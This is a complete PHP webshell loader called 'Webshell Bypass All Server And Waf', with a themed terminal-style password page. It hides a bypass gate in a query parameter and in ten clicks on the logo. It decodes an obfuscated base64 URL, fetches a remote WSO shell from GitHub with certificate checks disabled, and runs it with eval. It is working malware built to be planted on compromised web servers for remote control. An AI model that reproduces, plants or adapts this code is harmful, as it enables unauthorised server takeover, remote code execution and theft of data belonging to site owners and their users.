<?php
/**
 * Project: Webshell Bypass All Server And Waf
 * Version: 5.1 [FIX ERROR SCREEN & URL SYNC]
 * Author: GarudaOfSecurity / SukaBintang01
 */
@session_start();
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('memory_limit', '512M');

$s_id = 'admin@sukabintang01'; 
$v_pass = '1ac1bddadcb7dea96ed231e661eba215';
$p_enc = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1RpdHVzczIyL1NoZWxsU3VrYUJpbnRhbmcwMS9yZWZzL2hlYWRzL21haW4vd3NvLnBocA==';
$logo = 'https://k.top4top.io/p_33076980l1.png';

if (isset($_GET['_sb_']) && $_GET['_sb_'] === 'gate_open_skb') {
    $_SESSION[$s_id] = true;
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['access_code'])) {
    if (md5($_POST['access_code']) === $v_pass) {
        $_SESSION[$s_id] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "ACCESS DENIED: UNAUTHORIZED_ANOMALY";
    }
}

if (isset($_SESSION[$s_id])) {
    $p_url = base64_decode($p_enc);
    $data = "";

    if (function_exists('curl_init')) {
        $ch = curl_init($p_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) NexusX/5.1');
        $data = curl_exec($ch);
        curl_close($ch);
    } 
    
    if (empty($data)) { $data = @file_get_contents($p_url); }

    if ($data) {
        eval('?>' . $data);
        exit;
    } else {
        echo "<body style='background:#000;color:#bf00ff;font-family:monospace;padding:20px;'>[!] SYSTEM_ERROR: Terjadi kegagalan saat mengambil payload dari GitHub. Pastikan server memiliki akses internet luar.</body>";
        exit;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Terminal | SKB01</title>
    <style>
        body { background-color: #000; color: #bf00ff; font-family: 'Courier New', monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        body::after { content: " "; position: absolute; top: 0; left: 0; bottom: 0; right: 0; background: linear-gradient(rgba(18,16,16,0) 50%, rgba(0, 0, 0, 0.1) 50%), linear-gradient(90deg, rgba(191, 0, 255, 0.05), rgba(0, 0, 0, 0.01), rgba(191, 0, 255, 0.05)); z-index: 10; background-size: 100% 3px, 3px 100%; pointer-events: none; }
        .terminal-container { width: 450px; padding: 30px; border: 2px solid #bf00ff; background: rgba(5, 0, 10, 0.95); box-shadow: 0 0 25px rgba(191, 0, 255, 0.6); z-index: 5; text-align: center; }
        .logo-box { margin-bottom: 15px; cursor: pointer; }
        .logo-box img { width: 85px; filter: drop-shadow(0 0 10px #bf00ff); }
        .mr-q-text { font-size: 24px; font-weight: bold; letter-spacing: 2px; color: #ff00ff; margin-bottom: 20px; display: inline-block; white-space: nowrap; overflow: hidden; border-right: 3px solid #ff00ff; width: 0; animation: typing 2s steps(16, end) forwards, blink-caret 0.75s step-end infinite; }
        @keyframes typing { from { width: 0 } to { width: 100%; } }
        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: #ff00ff; } }
        .sys-box { text-align: left; font-size: 0.85em; border-top: 1px solid #ff00ff; padding-top: 15px; margin-bottom: 15px; }
        .sys-label { color: #ff00ff; font-weight: bold; } 
        .sys-val { color: #fff; }
        .input-line { display: flex; align-items: center; background: rgba(191, 0, 255, 0.1); border: 1px solid #ff00ff; padding: 10px; margin-top: 10px; }
        .prompt { color: #ff00ff; margin-right: 10px; font-weight: bold; }
        input[type="password"] { background: transparent; border: none; color: #bf00ff; font-family: 'Courier New', monospace; font-size: 1.2em; width: 100%; outline: none; }
        .footer { margin-top: 25px; font-size: 11px; opacity: 0.8; color: #ff00ff; }
    </style>
</head>
<body>

<div class="terminal-container">
    <div class="logo-box" id="sys_logo">
        <img src="<?php echo $logo; ?>" alt="System Logo">
    </div>
    <div><span class="mr-q-text">GarudaOfSecurity</span></div>
    <div class="sys-box">
        <span class="sys-label">ID:</span> <span class="sys-val">ROOT_USER_SKB01</span><br>
        <span class="sys-label">LOC:</span> <span class="sys-val"><?php echo $_SERVER['REMOTE_ADDR']; ?></span><br>
        <span class="sys-label">SYS:</span> <span class="sys-val">ENCRYPTED_CONNECTION</span>
    </div>
    <form method="POST">
        <div class="input-line">
            <span class="prompt">#PASSWD:</span>
            <input type="password" name="access_code" autofocus autocomplete="off">
        </div>
    </form>
    <div class="footer">&copy; 2026 GarudaOfSecurity | SukaBintang01</div>
</div>

<script>
    let _v = 0;
    document.getElementById('sys_logo').addEventListener('click', function() {
        _v++;
        if (_v === 10) { window.location.href = window.location.pathname + "?_sb_=gate_open_skb"; }
    });
</script>

</body>
</html>
